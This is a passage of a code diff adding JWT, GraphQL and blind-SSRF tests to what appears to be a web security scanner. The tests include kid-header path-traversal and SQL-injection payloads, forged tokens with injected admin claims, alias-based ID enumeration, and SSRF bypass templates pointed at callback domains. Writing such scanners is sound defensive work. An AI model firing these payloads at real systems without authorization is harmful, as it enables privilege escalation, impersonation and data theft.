+    kid_payloads = [
+        # Path traversal to /dev/null (empty key)
+        ("../../../../../../../dev/null", "", "path_traversal"),
+        ("....//....//....//....//dev/null", "", "path_traversal_bypass"),
+        ("/dev/null", "", "absolute_path"),
+        # SQL injection payloads
+        ("' UNION SELECT 'secret' -- ", "secret", "sqli_union"),
+        ("1'; SELECT 'secret';--", "secret", "sqli_stacked"),
+    ]
+
+    try:
+        import jwt as pyjwt
+
+        for kid_payload, expected_secret, attack_type in kid_payloads:
+            try:
+                forged_token = pyjwt.encode(payload, expected_secret, algorithm='HS256', headers={'kid': kid_payload})
+
+                auth_args = get_auth_curl_args(auth_session)  # Handles None internally
+                test_out, test_err, test_rc = await run(
+                    ["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {forged_token}"] + auth_args + [url],
+                    timeout=10
+                )
+
+                if test_rc == 0 and test_out:
+                    if "401" not in test_out[:200] and "403" not in test_out[:200] and "unauthorized" not in test_out.lower()[:500]:
+                        results["vulnerable"] = True
+                        results["issues"].append(f"kid_{attack_type}")
+                        results["evidence"].append({
+                            "type": f"kid_{attack_type}",
+                            "kid_payload": kid_payload,
+                            "description": f"Server accepted JWT with injected kid: {kid_payload}",
+                        })
+            except Exception:
+                continue
+
+    except ImportError:
+        pass
+
+    return results
+
+
+async def jwt_claim_manipulation_test(
+    url: str,
+    sample_token: str,
+    known_secret: str | None = None,
+    auth_session: Any = None,
+) -> dict[str, Any]:
+    """
+    Test JWT claim manipulation vulnerabilities.
+
+    If the JWT secret is weak/known, test if manipulated claims are accepted:
+    1. Privilege escalation via role/admin claims
+    2. User impersonation via sub/user_id claims
+    3. Expiration bypass via exp claim
+    """
+    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}
+
+    if not known_secret:
+        return results
+
+    header, payload, _ = _decode_jwt_parts(sample_token)
+    if not header or not payload:
+        return results
+
+    try:
+        import jwt as pyjwt
+
+        # Privilege escalation claims to inject
+        escalation_claims = [
+            ({"role": "admin"}, "role_admin"),
+            ({"admin": True}, "admin_true"),
+            ({"is_admin": True}, "is_admin_true"),
+            ({"isAdmin": True}, "isAdmin_true"),
+            ({"roles": ["admin", "superuser"]}, "roles_array"),
+            ({"permissions": ["*", "admin:*"]}, "permissions_wildcard"),
+            ({"groups": ["administrators", "superusers"]}, "groups_admin"),
+            ({"scope": "admin read write delete"}, "scope_admin"),
+        ]
+
+        auth_args = get_auth_curl_args(auth_session)  # Handles None internally
+
+        # Get baseline response with original token
+        baseline_out, _, baseline_rc = await run(
+            ["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {sample_token}"] + auth_args + [url],
+            timeout=10
+        )
+
+        for claim_dict, claim_type in escalation_claims:
+            try:
+                modified_payload = payload.copy()
+                modified_payload.update(claim_dict)
+
+                alg = header.get('alg', 'HS256')
+                if alg.upper() not in ['HS256', 'HS384', 'HS512']:
+                    alg = 'HS256'
+
+                forged_token = pyjwt.encode(modified_payload, known_secret, algorithm=alg)
+
+                test_out, test_err, test_rc = await run(
+                    ["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {forged_token}"] + auth_args + [url],
+                    timeout=10
+                )
+
+                if test_rc == 0 and test_out:
+                    if "401" not in test_out[:200] and "403" not in test_out[:200]:
+                        if baseline_out and test_out != baseline_out:
+                            results["vulnerable"] = True
+                            results["issues"].append(f"claim_manipulation_{claim_type}")
+                            results["evidence"].append({
+                                "type": "claim_manipulation",
+                                "claim": claim_dict,
+                                "claim_type": claim_type,
+                                "description": f"Server accepted modified claims: {claim_dict}",
+                            })
+            except Exception:
+                continue
+
+        # Test expiration bypass
+        try:
+            modified_payload = payload.copy()
+            modified_payload['exp'] = int(time.time()) + (365 * 24 * 60 * 60 * 10)  # 10 years
+            modified_payload['iat'] = int(time.time())
+
+            forged_token = pyjwt.encode(modified_payload, known_secret, algorithm='HS256')
+
+            test_out, test_err, test_rc = await run(
+                ["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {forged_token}"] + auth_args + [url],
+                timeout=10
+            )
+
+            if test_rc == 0 and test_out and "401" not in test_out[:200] and "403" not in test_out[:200]:
+                results["issues"].append("exp_manipulation")
+                results["evidence"].append({
+                    "type": "exp_manipulation",
+                    "description": "Server accepts tokens with manipulated expiration",
+                })
+        except Exception:
+            pass
+
+        if results["issues"]:
+            results["vulnerable"] = True
+
+    except ImportError:
+        pass
+
+    return results
+
+
+async def jwt_comprehensive_test(
+    url: str,
+    sample_token: str | None = None,
+    auth_session: Any = None,
+) -> dict[str, Any]:
+    """
+    Run comprehensive JWT security tests.
+
+    Combines all JWT vulnerability tests:
+    1. None algorithm
+    2. Weak secret brute-force (extended)
+    3. Algorithm confusion (RS256->HS256)
+    4. kid header injection
+    5. Claim manipulation
+    """
+    results: dict[str, Any] = {
+        "vulnerable": False,
+        "issues": [],
+        "evidence": [],
+        "tests_run": [],
+        "weak_secret_found": None,
+    }
+
+    # Try to discover token if not provided
+    if not sample_token:
+        for endpoint in ["/api/login", "/api/auth", "/login", "/auth/login", "/api/token"]:
+            login_url = urllib.parse.urljoin(url, endpoint)
+            out, err, rc = await run(
+                ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
+                 "-d", '{"username":"test","password":"test"}', login_url],
+                timeout=10
+            )
+            if rc == 0 and out:
+                m = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', out)
+                if m:
+                    sample_token = m.group(0)
+                    break
+
+        if not sample_token:
+            out, err, rc = await run(["curl", "-sS", "-I", "-L", "-k", url], timeout=10)
+            if rc == 0 and out:
+                m = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', out)
+                if m:
+                    sample_token = m.group(0)
+
+    if not sample_token:
+        results["error"] = "No JWT token found"
+        return results
+
+    results["token_found"] = True
+
+    header, payload, _ = _decode_jwt_parts(sample_token)
+    if header:
+        results["token_info"] = {
+            "algorithm": header.get('alg'),
+            "type": header.get('typ'),
+            "has_kid": 'kid' in header,
+        }
+
+    # Test 1: None algorithm + basic weak secrets
+    results["tests_run"].append("none_algorithm")
+    basic_results = await jwt_vulnerability_test(url, sample_token)
+    if basic_results.get("vulnerable"):
+        results["vulnerable"] = True
+        results["issues"].extend(basic_results.get("issues", []))
+        results["evidence"].extend(basic_results.get("evidence", []))
+
+        for ev in basic_results.get("evidence", []):
+            if ev.get("type") == "weak_secret":
+                results["weak_secret_found"] = ev.get("secret")
+
+    # Test 2: Extended weak secret brute-force
+    if not results["weak_secret_found"]:
+        results["tests_run"].append("weak_secret_extended")
+        secrets_to_test = _load_jwt_secrets_wordlist()
+
+        try:
+            import jwt as pyjwt
+
+            for secret in secrets_to_test:
+                if secret in ['secret', 'password', '123456', 'key', 'jwt', 'token']:
+                    continue
+                try:
+                    pyjwt.decode(sample_token, secret, algorithms=['HS256', 'HS384', 'HS512'])
+                    results["vulnerable"] = True
+                    results["issues"].append("weak_secret")
+                    results["evidence"].append({"type": "weak_secret", "secret": secret})
+                    results["weak_secret_found"] = secret
+                    break
+                except Exception:
+                    continue
+        except ImportError:
+            pass
+
+    # Test 3: Algorithm confusion
+    if header and header.get('alg', '').upper().startswith(('RS', 'ES', 'PS')):
+        results["tests_run"].append("algorithm_confusion")
+        confusion_results = await jwt_algorithm_confusion_test(url, sample_token, auth_session=auth_session)
+        if confusion_results.get("vulnerable"):
+            results["vulnerable"] = True
+            results["issues"].extend(confusion_results.get("issues", []))
+            results["evidence"].extend(confusion_results.get("evidence", []))
+
+    # Test 4: kid header injection
+    if header and 'kid' in header:
+        results["tests_run"].append("kid_injection")
+        kid_results = await jwt_kid_injection_test(url, sample_token, auth_session=auth_session)
+        if kid_results.get("vulnerable"):
+            results["vulnerable"] = True
+            results["issues"].extend(kid_results.get("issues", []))
+            results["evidence"].extend(kid_results.get("evidence", []))
+
+    # Test 5: Claim manipulation
+    if results["weak_secret_found"]:
+        results["tests_run"].append("claim_manipulation")
+        claim_results = await jwt_claim_manipulation_test(
+            url, sample_token,
+            known_secret=results["weak_secret_found"],
+            auth_session=auth_session
+        )
+        if claim_results.get("vulnerable"):
+            results["vulnerable"] = True
+            results["issues"].extend(claim_results.get("issues", []))
+            results["evidence"].extend(claim_results.get("evidence", []))
+
     return results
 
 
@@ -2117,6 +3646,830 @@ async def graphql_vulnerability_test(url: str) -> dict[str, Any]:
                     results["vulnerable"] = True; results["issues"].append("introspection_enabled"); results["evidence"].append({"type": "introspection_enabled", "endpoint": endpoint})
             except Exception:
                 pass
+    return results
+
+
+# =============================================================================
+# ENHANCED GRAPHQL SECURITY TESTING
+# =============================================================================
+
+GRAPHQL_ENDPOINTS = ["/graphql", "/graphql/v2", "/api/graphql", "/query", "/gql", "/api/gql"]
+
+
+async def _find_graphql_endpoint(url: str, auth_session: Any = None) -> str | None:
+    """Find a working GraphQL endpoint by testing common paths."""
+    auth_args = get_auth_curl_args(auth_session)  # Handles None internally
+
+    for endpoint in GRAPHQL_ENDPOINTS:
+        graphql_url = urllib.parse.urljoin(url, endpoint)
+        test_query = {"query": "{ __typename }"}
+        out, err, rc = await run(
+            ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
+             "-d", json.dumps(test_query)] + auth_args + [graphql_url],
+            timeout=10
+        )
+        if rc == 0 and out:
+            try:
+                response = json.loads(out)
+                if "data" in response or "errors" in response:
+                    return graphql_url
+            except Exception:
+                continue
+    return None
+
+
+async def graphql_batch_attack_test(
+    url: str,
+    graphql_url: str | None = None,
+    auth_session: Any = None,
+) -> dict[str, Any]:
+    """
+    Test GraphQL batching vulnerabilities.
+
+    GraphQL servers may accept arrays of queries, allowing:
+    1. Batch brute-force attacks (multiple login attempts in one request)
+    2. Rate limit bypass (100 queries counted as 1 request)
+    3. Resource exhaustion (many expensive queries at once)
+
+    Args:
+        url: Base URL
+        graphql_url: GraphQL endpoint (auto-discovered if not provided)
+        auth_session: AuthSession for authenticated testing
+
+    Returns:
+        Dict with vulnerability findings
+    """
+    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}
+
+    if not graphql_url:
+        graphql_url = await _find_graphql_endpoint(url, auth_session)
+        if not graphql_url:
+            return results
+
+    auth_args = get_auth_curl_args(auth_session)  # Handles None internally
+
+    # Test 1: Array batching (multiple queries in array)
+    batch_queries = [
+        {"query": "{ __typename }"},
+        {"query": "{ __typename }"},
+        {"query": "{ __typename }"},
+        {"query": "{ __typename }"},
+        {"query": "{ __typename }"},
+    ]
+
+    out, err, rc = await run(
+        ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
+         "-d", json.dumps(batch_queries)] + auth_args + [graphql_url],
+        timeout=15
+    )
+
+    if rc == 0 and out:
+        try:
+            response = json.loads(out)
+            # If response is an array with multiple results, batching is supported
+            if isinstance(response, list) and len(response) >= 5:
+                results["vulnerable"] = True
+                results["issues"].append("batch_queries_allowed")
+                results["evidence"].append({
+                    "type": "batch_queries_allowed",
+                    "endpoint": graphql_url,
+                    "batch_size_tested": len(batch_queries),
+                    "responses_received": len(response),
+                    "description": "GraphQL server accepts batched queries (array format)",
+                    "risk": "Rate limit bypass, brute-force amplification",
+                })
+        except Exception:
+            pass
+
+    # Test 2: Large batch (test if there's a limit)
+    large_batch = [{"query": "{ __typename }"} for _ in range(50)]
+
+    out, err, rc = await run(
+        ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
+         "-d", json.dumps(large_batch)] + auth_args + [graphql_url],
+        timeout=30
+    )
+
+    if rc == 0 and out:
+        try:
+            response = json.loads(out)
+            if isinstance(response, list) and len(response) >= 50:
+                results["issues"].append("no_batch_limit")
+                results["evidence"].append({
+                    "type": "no_batch_limit",
+                    "endpoint": graphql_url,
+                    "batch_size_tested": 50,
+                    "responses_received": len(response),
+                    "description": "No apparent batch query limit (50+ queries accepted)",
+                    "risk": "DoS via query batching",
+                })
+        except Exception:
+            pass
+
+    # Test 3: Aliased batch (multiple operations in single query using aliases)
+    alias_query = """
+    query {
+        a1: __typename
+        a2: __typename
+        a3: __typename
+        a4: __typename
+        a5: __typename
+        a6: __typename
+        a7: __typename
+        a8: __typename
+        a9: __typename
+        a10: __typename
+    }
+    """
+
+    out, err, rc = await run(
+        ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
+         "-d", json.dumps({"query": alias_query})] + auth_args + [graphql_url],
+        timeout=15
+    )
+
+    if rc == 0 and out:
+        try:
+            response = json.loads(out)
+            data = response.get("data", {})
+            if data and len(data) >= 10:
+                results["issues"].append("alias_batching")
+                results["evidence"].append({
+                    "type": "alias_batching",
+                    "endpoint": graphql_url,
+                    "aliases_tested": 10,
+                    "description": "GraphQL allows alias-based batching in single query",
+                    "risk": "Rate limit bypass via aliases",
+                })
+        except Exception:
+            pass
+
+    if results["issues"]:
+        results["vulnerable"] = True
+
+    return results
+
+
+async def graphql_depth_attack_test(
+    url: str,
+    graphql_url: str | None = None,
+    auth_session: Any = None,
+    max_depth: int = 15,
+) -> dict[str, Any]:
+    """
+    Test GraphQL query depth limits.
+
+    Deep nested queries can cause:
+    1. DoS via exponential resource consumption
+    2. N+1 query problems amplified
+    3. Stack overflow on poorly implemented servers
+
+    Args:
+        url: Base URL
+        graphql_url: GraphQL endpoint
+        auth_session: AuthSession for authenticated testing
+        max_depth: Maximum nesting depth to test
+
+    Returns:
+        Dict with vulnerability findings
+    """
+    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": [], "max_depth_accepted": 0}
+
+    if not graphql_url:
+        graphql_url = await _find_graphql_endpoint(url, auth_session)
+        if not graphql_url:
+            return results
+
+    auth_args = get_auth_curl_args(auth_session)  # Handles None internally
+
+    # First, get schema to find recursive types
+    introspection_query = {
+        "query": """
+        {
+            __schema {
+                types {
+                    name
+                    fields {
+                        name
+                        type {
+                            name
+                            kind
+                            ofType { name kind }
+                        }
+                    }
+                }
+            }
+        }
+        """
+    }
+
+    out, err, rc = await run(
+        ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
+         "-d", json.dumps(introspection_query)] + auth_args + [graphql_url],
+        timeout=15
+    )
+
+    # Try to build a deep query based on schema
+    # If introspection fails, use generic __typename nesting
+    deep_query_template = "{ __typename }"
+
+    # Build increasingly deep queries
+    for depth in [5, 10, 15, 20]:
+        if depth > max_depth:
+            break
+
+        # Build nested __type query (uses introspection which is often allowed)
+        nested = "__typename"
+        for _ in range(depth):
+            nested = f"__type(name: \"Query\") {{ name fields {{ name type {{ {nested} }} }} }}"
+
+        deep_query = {"query": f"{{ {nested} }}"}
+
+        out, err, rc = await run(
+            ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
+             "-d", json.dumps(deep_query)] + auth_args + [graphql_url],
+            timeout=30
+        )
+
+        if rc == 0 and out:
+            try:
+                response = json.loads(out)
+                errors = response.get("errors", [])
+
+                # Check if query was rejected for depth
+                depth_rejected = any(
+                    "depth" in str(e).lower() or "complexity" in str(e).lower() or "too deep" in str(e).lower()
+                    for e in errors
+                )
+
+                if depth_rejected:
+                    results["max_depth_accepted"] = depth - 5 if depth > 5 else depth
+                    break
+
+                if "data" in response:
+                    results["max_depth_accepted"] = depth
+
+            except Exception:
+                pass
+
+    if results["max_depth_accepted"] >= 10:
+        results["vulnerable"] = True
+        results["issues"].append("no_depth_limit")
+        results["evidence"].append({
+            "type": "no_depth_limit",
+            "endpoint": graphql_url,
+            "max_depth_tested": results["max_depth_accepted"],
+            "description": f"GraphQL accepts queries nested {results['max_depth_accepted']}+ levels deep",
+            "risk": "DoS via deeply nested queries",
+        })
+
+    return results
+
+
+async def graphql_alias_idor_test(
+    url: str,
+    graphql_url: str | None = None,
+    auth_session: Any = None,
+) -> dict[str, Any]:
+    """
+    Test GraphQL alias-based IDOR vulnerabilities.
+
+    Using aliases, an attacker can query multiple resources in a single request,
+    potentially bypassing per-request authorization checks.
+
+    Args:
+        url: Base URL
+        graphql_url: GraphQL endpoint
+        auth_session: AuthSession for authenticated testing
+
+    Returns:
+        Dict with vulnerability findings
+    """
+    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}
+
+    if not graphql_url:
+        graphql_url = await _find_graphql_endpoint(url, auth_session)
+        if not graphql_url:
+            return results
+
+    auth_args = get_auth_curl_args(auth_session)  # Handles None internally
+
+    # First get schema to find queryable types with ID arguments
+    introspection_query = {
+        "query": """
+        {
+            __schema {
+                queryType {
+                    fields {
+                        name
+                        args {
+                            name
+                            type { name kind }
+                        }
+                    }
+                }
+            }
+        }
+        """
+    }
+
+    out, err, rc = await run(
+        ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
+         "-d", json.dumps(introspection_query)] + auth_args + [graphql_url],
+        timeout=15
+    )
+
+    id_queries = []
+    if rc == 0 and out:
+        try:
+            response = json.loads(out)
+            query_fields = response.get("data", {}).get("__schema", {}).get("queryType", {}).get("fields", [])
+
+            for field in query_fields:
+                field_name = field.get("name", "")
+                args = field.get("args", [])
+
+                # Look for fields with id/ID arguments
+                for arg in args:
+                    arg_name = arg.get("name", "").lower()
+                    if arg_name in ["id", "userid", "user_id", "accountid", "account_id"]:
+                        id_queries.append((field_name, arg.get("name")))
+                        break
+
+        except Exception:
+            pass
+
+    # If we found ID-based queries, test alias enumeration
+    if id_queries:
+        field_name, arg_name = id_queries[0]
+
+        # Build alias query to fetch multiple IDs at once
+        alias_parts = []
+        for i in range(1, 11):
+            alias_parts.append(f'u{i}: {field_name}({arg_name}: "{i}") {{ __typename }}')
+
+        alias_query = {"query": "{ " + " ".join(alias_parts) + " }"}
+
+        out, err, rc = await run(
+            ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
+             "-d", json.dumps(alias_query)] + auth_args + [graphql_url],
+            timeout=15
+        )
+
+        if rc == 0 and out:
+            try:
+                response = json.loads(out)
+                data = response.get("data", {})
+
+                # Count successful responses
+                successful = sum(1 for k, v in data.items() if v is not None)
+
+                if successful > 1:
+                    results["vulnerable"] = True
+                    results["issues"].append("alias_idor")
+                    results["evidence"].append({
+                        "type": "alias_idor",
+                        "endpoint": graphql_url,
+                        "field": field_name,
+                        "ids_queried": 10,
+                        "ids_returned": successful,
+                        "description": f"Alias-based IDOR: {successful}/10 objects accessible via aliases",
+                        "risk": "Mass data enumeration via single request",
+                    })
+            except Exception:
+                pass
+
+    return results
+
+
+async def graphql_field_suggestion_test(
+    url: str,
+    graphql_url: str | None = None,
+    auth_session: Any = None,
+) -> dict[str, Any]:
+    """
+    Test GraphQL field suggestion information disclosure.
+
+    Many GraphQL servers provide helpful error messages that suggest
+    valid field names, enabling schema discovery without introspection.
+
+    Args:
+        url: Base URL
+        graphql_url: GraphQL endpoint
+        auth_session: AuthSession for authenticated testing
+
+    Returns:
+        Dict with vulnerability findings
+    """
+    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": [], "discovered_fields": []}
+
+    if not graphql_url:
+        graphql_url = await _find_graphql_endpoint(url, auth_session)
+        if not graphql_url:
+            return results
+
+    auth_args = get_auth_curl_args(auth_session)  # Handles None internally
+
+    # Test queries with intentionally wrong field names
+    test_queries = [
+        {"query": "{ usr }"},  # Might suggest "user"
+        {"query": "{ passwrd }"},  # Might suggest "password"
+        {"query": "{ emial }"},  # Might suggest "email"
+        {"query": "{ admi }"},  # Might suggest "admin"
+        {"query": "{ secrt }"},  # Might suggest "secret"
+        {"query": "{ toke }"},  # Might suggest "token"
+        {"query": "{ accoun }"},  # Might suggest "account"
+    ]
+
+    discovered = set()
+
+    for query in test_queries:
+        out, err, rc = await run(
+            ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
+             "-d", json.dumps(query)] + auth_args + [graphql_url],
+            timeout=10
+        )
+
+        if rc == 0 and out:
+            try:
+                response = json.loads(out)
+                errors = response.get("errors", [])
+
+                for error in errors:
+                    message = error.get("message", "")
+                    # Look for suggestion patterns
+                    # Common patterns: "Did you mean X?", "Perhaps you meant X", "Unknown field X. Did you mean Y?"
+                    suggestion_patterns = [
+                        r'[Dd]id you mean ["\']?(\w+)["\']?',
+                        r'[Pp]erhaps you meant ["\']?(\w+)["\']?',
+                        r'[Ss]uggested: ["\']?(\w+)["\']?',
+                        r'[Ss]imilar field: ["\']?(\w+)["\']?',
+                    ]
+
+                    for pattern in suggestion_patterns:
+                        matches = re.findall(pattern, message)
+                        discovered.update(matches)
+
+            except Exception:
+                pass
+
+    if discovered:
+        results["vulnerable"] = True
+        results["issues"].append("field_suggestions_enabled")
+        results["discovered_fields"] = list(discovered)
+        results["evidence"].append({
+            "type": "field_suggestions_enabled",
+            "endpoint": graphql_url,
+            "discovered_fields": list(discovered),
+            "description": f"GraphQL provides field suggestions, discovered: {', '.join(list(discovered)[:10])}",
+            "risk": "Schema discovery without introspection access",
+        })
+
+    return results
+
+
+async def graphql_comprehensive_test(
+    url: str,
+    graphql_url: str | None = None,
+    auth_session: Any = None,
+) -> dict[str, Any]:
+    """
+    Run comprehensive GraphQL security tests.
+
+    Combines all GraphQL vulnerability tests:
+    1. Introspection enabled
+    2. Batch query attacks
+    3. Query depth limits
+    4. Alias-based IDOR
+    5. Field suggestion disclosure
+
+    Args:
+        url: Base URL
+        graphql_url: GraphQL endpoint (auto-discovered if not provided)
+        auth_session: AuthSession for authenticated testing
+
+    Returns:
+        Dict with all findings
+    """
+    results: dict[str, Any] = {
+        "vulnerable": False,
+        "issues": [],
+        "evidence": [],
+        "tests_run": [],
+        "graphql_url": None,
+    }
+
+    # Find GraphQL endpoint
+    if not graphql_url:
+        graphql_url = await _find_graphql_endpoint(url, auth_session)
+
+    if not graphql_url:
+        results["error"] = "No GraphQL endpoint found"
+        return results
+
+    results["graphql_url"] = graphql_url
+
+    # Test 1: Basic introspection
+    results["tests_run"].append("introspection")
+    basic_results = await graphql_vulnerability_test(url)
+    if basic_results.get("vulnerable"):
+        results["vulnerable"] = True
+        results["issues"].extend(basic_results.get("issues", []))
+        results["evidence"].extend(basic_results.get("evidence", []))
+
+    # Test 2: Batch attacks
+    results["tests_run"].append("batch_attacks")
+    batch_results = await graphql_batch_attack_test(url, graphql_url, auth_session)
+    if batch_results.get("vulnerable"):
+        results["vulnerable"] = True
+        results["issues"].extend(batch_results.get("issues", []))
+        results["evidence"].extend(batch_results.get("evidence", []))
+
+    # Test 3: Depth limits
+    results["tests_run"].append("depth_limits")
+    depth_results = await graphql_depth_attack_test(url, graphql_url, auth_session)
+    if depth_results.get("vulnerable"):
+        results["vulnerable"] = True
+        results["issues"].extend(depth_results.get("issues", []))
+        results["evidence"].extend(depth_results.get("evidence", []))
+
+    # Test 4: Alias IDOR (only if introspection is available)
+    if "introspection_enabled" in results["issues"]:
+        results["tests_run"].append("alias_idor")
+        idor_results = await graphql_alias_idor_test(url, graphql_url, auth_session)
+        if idor_results.get("vulnerable"):
+            results["vulnerable"] = True
+            results["issues"].extend(idor_results.get("issues", []))
+            results["evidence"].extend(idor_results.get("evidence", []))
+
+    # Test 5: Field suggestions
+    results["tests_run"].append("field_suggestions")
+    suggestion_results = await graphql_field_suggestion_test(url, graphql_url, auth_session)
+    if suggestion_results.get("vulnerable"):
+        results["vulnerable"] = True
+        results["issues"].extend(suggestion_results.get("issues", []))
+        results["evidence"].extend(suggestion_results.get("evidence", []))
+        results["discovered_fields"] = suggestion_results.get("discovered_fields", [])
+
+    # Test 6: Schema recovery (when introspection is disabled)
+    # Uses Clairvoyance methodology to recover schema via error messages
+    if HAS_GRAPHQL_RECOVERY and "introspection_enabled" not in results["issues"]:
+        results["tests_run"].append("schema_recovery")
+        try:
+            auth_header = None
+            if auth_session:
+                auth_header = auth_session.auth_header
+            recovery_results = await graphql_schema_recovery(
+                url=url,
+                graphql_url=graphql_url,
+                auth_header=auth_header,
+                thorough=False,  # Use thorough=True for deeper scanning
+            )
+            if recovery_results.get("success") and recovery_results.get("findings"):
+                results["vulnerable"] = True
+                results["issues"].append("schema_recoverable_via_errors")
+                for finding in recovery_results.get("findings", []):
+                    results["evidence"].append({
+                        "type": finding.get("type"),
+                        "endpoint": graphql_url,
+                        "description": finding.get("description"),
+                        "evidence": finding.get("evidence"),
+                        "remediation": finding.get("remediation"),
+                    })
+                results["recovered_schema"] = recovery_results.get("schema")
+                results["recovered_schema_sdl"] = recovery_results.get("schema_sdl")
+                results["schema_recovery_summary"] = recovery_results.get("summary")
+        except Exception as e:
+            # Schema recovery is optional, don't fail the whole test
+            pass
+
+    return results
+
+
+# =============================================================================
+# P1-3: BLIND SSRF WITH OOB CALLBACKS
+# =============================================================================
+
+# Common SSRF injection parameters
+SSRF_PARAMS = [
+    "url", "uri", "path", "dest", "redirect", "link", "proxy",
+    "domain", "host", "site", "html", "val", "feed", "dir",
+    "page", "callback", "webhook", "target", "src", "file",
+    "reference", "ref", "fetch", "request", "load", "data",
+    "image", "img", "pdf", "document", "download", "resource",
+]
+
+# SSRF payload templates (placeholder {CALLBACK} will be replaced)
+SSRF_PAYLOAD_TEMPLATES = [
+    "{CALLBACK}",
+    "http://{CALLBACK}",
+    "https://{CALLBACK}",
+    "//{CALLBACK}",
+    "http://{CALLBACK}/test",
+    "https://{CALLBACK}/test.html",
+    # URL encoding bypasses
+    "http%3A%2F%2F{CALLBACK}",
+    "http://{CALLBACK}%00.example.com",
+    "http://example.com@{CALLBACK}",
+    "http://{CALLBACK}#.example.com",
+    "http://{CALLBACK}?.example.com",
+    # DNS rebinding style
+    "http://127.0.0.1.{CALLBACK}",
+]
+
+
+async def blind_ssrf_test(
+    url: str,
+    callback_domain: str,
+    params_to_test: list[str] | None = None,
+    auth_session: Any | None = None,
+    timeout: int = 10,
+) -> dict[str, Any]:
+    """
+    P1-3 FIX: Test for blind SSRF using out-of-band (OOB) callbacks.
+
+    Blind SSRF occurs when the server makes a request to an attacker-controlled
+    URL but doesn't return the response. Detection requires an OOB callback
+    server (like Burp Collaborator, interactsh, or custom DNS logger).
+
+    USAGE: This is an API function - not auto-run in scans because it requires
+    a user-provided callback domain. Call via API or integrate with your own
+    callback infrastructure:
+
+        result = await blind_ssrf_test(
+            "https://target.com/api?url=test",
+            callback_domain="abc123.oast.fun"
+        )
+        # Then check your callback server for hits
+
+    Args:
+        url: Target URL to test
+        callback_domain: Domain for OOB callbacks (e.g., "yourserver.oast.fun")
+        params_to_test: Specific parameters to test (defaults to SSRF_PARAMS)
+        auth_session: Optional auth session
+        timeout: Request timeout in seconds
+
+    Returns:
+        Dict with test results and any detected callbacks
+    """
+    import uuid
+    import time as time_mod
+
+    results: dict[str, Any] = {
+        "vulnerable": False,
+        "tested_params": [],
+        "payloads_injected": 0,
+        "callbacks_expected": [],
+        "findings": [],
+        "evidence": [],
+        "scan_completed": False,
+    }
+
+    if not callback_domain:
+        results["error"] = "No callback domain provided - blind SSRF requires OOB callback server"
+        return results
+
+    parsed = urllib.parse.urlparse(url)
+    query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+
+    # Determine which parameters to test
+    test_params = params_to_test or SSRF_PARAMS
+
+    # Also test any existing query params
+    if query_params:
+        test_params = list(set(test_params + list(query_params.keys())))
+
+    auth_args = get_auth_curl_args(auth_session)
+
+    injected_callbacks: list[dict[str, Any]] = []
+
+    for param in test_params[:20]:  # Limit to 20 params
+        results["tested_params"].append(param)
+
+        # Generate unique callback ID for this parameter
+        callback_id = f"ssrf-{uuid.uuid4().hex[:8]}"
+        callback_url = f"{callback_id}.{callback_domain}"
+
+        for payload_template in SSRF_PAYLOAD_TEMPLATES[:5]:  # Limit payloads
+            payload = payload_template.replace("{CALLBACK}", callback_url)
+
+            # Build test URL with payload
+            test_params_dict = dict(query_params)
+            test_params_dict[param] = [payload]
+            test_query = urllib.parse.urlencode(test_params_dict, doseq=True)
+            test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
+
+            # Inject payload
+            try:
+                out, _, rc = await run([
+                    "curl", "-sS", "-k", "--max-time", str(timeout),
+                    "-o", "/dev/null", "-w", "%{http_code}",
+                    "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner)",
+                ] + auth_args + [test_url], timeout=timeout + 5)
+
+                results["payloads_injected"] += 1
+
+                injected_callbacks.append({
+                    "callback_id": callback_id,
+                    "callback_url": callback_url,
+                    "param": param,
+                    "payload": payload,
+                    "injected_at": time_mod.time(),
+                })
+            except Exception:
+                continue
+
+    results["callbacks_expected"] = [c["callback_url"] for c in injected_callbacks]
+    results["injection_count"] = len(injected_callbacks)
+
+    # Note: Actual callback verification requires checking the OOB server
+    # This function prepares the injections; callback checking is done separately
+    results["scan_completed"] = True
+    results["note"] = (
+        f"Injected {len(injected_callbacks)} SSRF payloads with OOB callbacks. "
+        f"Check your callback server ({callback_domain}) for incoming requests. "
+        "Each callback URL is unique to identify which parameter is vulnerable."
+    )
+
+    return results
+
+
+async def check_ssrf_callbacks(
+    callback_server_api: str,
+    expected_callbacks: list[str],
+    api_key: str | None = None,
+    timeout: int = 30,
+) -> dict[str, Any]:
+    """
+    Check OOB callback server for SSRF hits.
+
+    This function queries a callback server API (like interactsh or custom)
+    to check if any of the expected callbacks were triggered.
+
+    Args:
+        callback_server_api: API endpoint to check callbacks
+        expected_callbacks: List of callback URLs to look for
+        api_key: Optional API key for the callback server
+        timeout: Query timeout
+
+    Returns:
+        Dict with confirmed callbacks and vulnerability status
+    """
+    results: dict[str, Any] = {
+        "callbacks_checked": len(expected_callbacks),
+        "callbacks_received": [],
+        "vulnerable": False,
+        "findings": [],
+    }
+
+    if not callback_server_api or not expected_callbacks:
+        return results
+
+    try:
